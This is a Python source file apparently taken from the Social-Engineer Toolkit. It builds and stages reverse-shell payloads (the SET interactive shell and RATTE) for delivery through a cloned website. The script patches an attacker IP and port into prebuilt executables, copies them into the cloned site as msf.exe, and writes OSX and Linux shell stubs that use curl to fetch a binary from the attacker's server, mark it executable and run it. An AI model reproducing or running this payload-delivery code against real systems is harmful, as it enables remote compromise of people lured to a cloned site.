#!/usr/bin/python
############################################
#
# Code behind the SET interactive shell
# and RATTE
#
############################################
import os
import sys
import subprocess
import re
import shutil
from src.core import setcore
import time

definepath = os.getcwd()
sys.path.append(definepath)

# grab operating system
operating_system = setcore.check_os()

# check the config file
fileopen = file("config/set_config", "r")
for line in fileopen:
    line = line.rstrip()
    # define if we use upx encoding or not
    match = re.search("UPX_ENCODE=", line)
    if match:
        upx_encode = line.replace("UPX_ENCODE=", "")
    # set the upx flag
    match1 = re.search("UPX_PATH=", line)
    if match1:
        upx_path = line.replace("UPX_PATH=", "")
        if upx_encode == "ON":
            if not os.path.isfile(upx_path):
                if operating_system != "windows":
                    setcore.print_warning("UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
                upx_encode == "OFF"
    # if we removed the set shells to free up space, needed for pwniexpress
    match2= re.search("SET_INTERACTIVE_SHELL=", line)
    if match2:
        line = line.replace("SET_INTERACTIVE_SHELL=", "").lower()
        if line == "off":
            sys.exit("\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")

# make directory if it's not there
if not os.path.isdir("src/program_junk/web_clone/"):
    os.makedirs("src/program_junk/web_clone/")

# grab ip address and SET web server interface
if os.path.isfile("src/program_junk/interface"):
    fileopen = file("src/program_junk/interface", "r")
    for line in fileopen:
        ipaddr = line.rstrip()
    if os.path.isfile("src/program_junk/ipaddr.file"):
        fileopen = file ("src/program_junk/ipaddr.file", "r")
        for line in fileopen:
            webserver = line.rstrip()

    if not os.path.isfile("src/program_junk/ipaddr.file"):
        ipaddr = raw_input(setcore.setprompt("0", "IP address to connect back on for the reverse listener"))

else:
    if os.path.isfile("src/program_junk/ipaddr.file"):
        fileopen = file("src/program_junk/ipaddr.file", "r")
        for line in fileopen:
            ipaddr = line.rstrip()
        webserver = ipaddr

# grab port options from payloadgen.py
if os.path.isfile("src/program_junk/port.options"):
    fileopen = file("src/program_junk/port.options", "r")
    for line in fileopen: 
        port = line.rstrip()
else:
    port = raw_input(setcore.setprompt("0", "Port you want to use for the connection back"))


# define the main variables here

# generate a random executable name per instance
exe_name = setcore.generate_random_string(10,10) + ".exe"

webserver = webserver + " " + port

# store for later
reverse_connection = webserver

webserver = exe_name + " " + webserver

# this is generated through payloadgen.py and lets SET know if its a RATTE payload or SET payload
if os.path.isfile("src/program_junk/set.payload"):
    fileopen = file("src/program_junk/set.payload", "r")
    for line in fileopen:
        payload_selection = line.rstrip()
else:
    payload_selection = "SETSHELL"


# determine if we want to target osx/nix as well
posix = False
# find if we selected it
if os.path.isfile("%s/src/program_junk/set.payload.posix" % (definepath)):
    # if we have then claim true
    posix = True

# if we selected the SET Interactive shell in payloadgen
if payload_selection == "SETSHELL":
    # replace ipaddress with one that we need for reverse connection back
    fileopen = open("src/payloads/set_payloads/downloader.windows" , "rb")
    data = fileopen.read()
    filewrite = open("src/program_junk/msf.exe" , "wb")
    host = int(len(exe_name)+1) * "X"
    webserver_count = int(len(webserver)+1) * "S"
    ipaddr_count = int(len(ipaddr)+1) * "M"
    filewrite.write(data.replace(str(host), exe_name+"\x00", 1))
    filewrite.close()
    fileopen = open("src/program_junk/msf.exe" , "rb")
    data = fileopen.read()
    filewrite = open("src/program_junk/msf.exe" , "wb")
    filewrite.write(data.replace(str(webserver_count), webserver+"\x00", 1))
    filewrite.close()
    fileopen = open("src/program_junk/msf.exe" , "rb")
    data = fileopen.read()
    filewrite = open("src/program_junk/msf.exe" , "wb")
    filewrite.write(data.replace(str(ipaddr_count), ipaddr+"\x00", 1))
    filewrite.close()
    shutil.copyfile("src/program_junk/msf.exe", "src/html/msf.exe")

# if we selected RATTE in our payload selection
if payload_selection == "RATTE":
    fileopen = file("src/payloads/ratte/ratte.binary", "rb")
    data = fileopen.read()
    filewrite = open("src/program_junk/msf.exe", "wb")
    host = int(len(ipaddr)+1) * "X"
    rPort = int(len(str(port))+1) * "Y"
    filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
    filewrite.close()
    fileopen = open("src/program_junk/msf.exe", "rb")
    data = fileopen.read()
    filewrite = open("src/program_junk/msf.exe", "wb")
    filewrite.write(data.replace(str(rPort), str(port)+"\x00", 1))
    filewrite.close()

setcore.print_status("Done, moving the payload into the action.")

if upx_encode == "ON" or upx_encode == "on":
    # core upx
    pass #setcore.upx("src/program_junk/msf.exe")

if os.path.isfile("src/program_junk/web_clone/msf.exe"):
    os.remove("src/program_junk/web_clone/msf.exe")
if os.path.isfile("src/program_junk/msf.exe"):
    shutil.copyfile("src/program_junk/msf.exe", "src/program_junk/web_clone/msf.exe")

if payload_selection == "SETSHELL":
    if os.path.isfile("%s/src/program_junk/web_clone/x" %(definepath)):
        os.remove("%s/src/program_junk/web_clone/x" % (definepath))
    shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" % (definepath), "%s/src/program_junk/web_clone/x" % (definepath))

# if we are targetting nix
if posix == True:
    setcore.print_info("Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
    filewrite = file("%s/src/program_junk/web_clone/mac.bin" % (definepath), "w")
    payload_flags = webserver.split(" ")
    # grab osx binary name
    osx_name = setcore.generate_random_string(10,10)
    downloader = "#!/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
    filewrite.write(downloader)
    filewrite.close()
    # grab nix binary name
    linux_name = setcore.generate_random_string(10,10)
    downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
    filewrite = file("%s/src/program_junk/web_clone/nix.bin" % (definepath), "w")
    filewrite.write(downloader)
    filewrite.close()
    shutil.copyfile("src/payloads/set_payloads/shell.osx", "src/program_junk/web_clone/%s" % (osx_name))
    shutil.copyfile("src/payloads/set_payloads/shell.linux", "src/program_junk/web_clone/%s" % (linux_name))

# check to see if we are using a staged approach or direct shell
stager = setcore.check_config("SET_SHELL_STAGER=").lower()
if stager == "off" or payload_selection == "SETSHELL_HTTP":
    # only trigger if we are using the SETSHELL
    if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
        # ensure that index.html is really there
        if os.path.isfile("src/program_junk/web_clone/index.html"):
            setcore.print_status("Stager turned off, prepping direct download payload...")
            fileopen = file("src/program_junk/web_clone/index.html", "r")
            filewrite = file("src/program_junk/web_clone/index.html.3", "w")
            data = fileopen.read()
            # replace freehugs with ip and port
            data = data.replace("freehugs", reverse_connection)
            filewrite.write(data)
            filewrite.close()
            time.sleep(1)

            # here we remove old stuff and replace with everything we need to be newer
            if payload_selection == "SETSHELL":
                try:
                    if os.path.isfile("src/program_junk/web_clone/index.html"):
                        os.remove("src/program_junk/web_clone/index.html")
                    shutil.copyfile("src/program_junk/web_clone/index.html.3", "src/program_junk/web_clone/index.html")
                    if os.path.isfile("src/program_junk/web_clone/index.html.3"):
                        os.remove("src/program_junk/web_clone/index.html.3")
                    if os.path.isfile("src/program_junk/web_clone/msf.exe"):
                        os.remove("src/program_junk/web_clone/msf.exe")
                    shutil.copyfile("src/program_junk/web_clone/x", "src/program_junk/web_clone/msf.exe")
                    if os.path.isfile("src/html/msf.exe"):
                        os.remove("src/html/msf.exe")
                    shutil.copyfile("src/program_junk/web_clone/msf.exe", "src/html/msf.exe")
                    if os.path.isfile("src/program_junk/msf.exe"):
                        os.remove("src/program_junk/msf.exe")
                    shutil.copyfile("src/program_junk/web_clone/msf.exe", "src/program_junk/msf.exe")

                # catch errors, will convert to log later
                except Exception, error:
                    setcore.log(error)

            # if we are using the HTTP reverse shell then lets use this
            if payload_selection == "SETSHELL_HTTP":
                try:
                    if os.path.isfile("src/program_junk/web_clone/index.html"):
                        os.remove("src/program_junk/web_clone/index.html")
                    shutil.copyfile("src/program_junk/web_clone/index.html.3", "src/program_junk/web_clone/index.html")
                    if os.path.isfile("src/program_junk/web_clone/index.html.3"):
                        os.remove("src/program_junk/web_clone/index.html.3")
                    if os.path.isfile("src/program_junk/web_clone/msf.exe"):
                        os.remove("src/program_junk/web_clone/msf.exe")
                    shutil.copyfile("src/payloads/set_payloads/http_shell.binary", "src/program_junk/web_clone/msf.exe")
                    if os.path.isfile("src/html/msf.exe"):        
                        os.remove("src/html/msf.exe")
                    shutil.copyfile("src/program_junk/web_clone/msf.exe", "src/html/msf.exe")
                    if os.path.isfile("src/program_junk/msf.exe"):
                        os.remove("src/program_junk/msf.exe")
                    shutil.copyfile("src/program_junk/web_clone/msf.exe", "src/program_junk/msf.exe")

                # catch errors, will convert to log later        
                except Exception, error:
                    setcore.log(error)
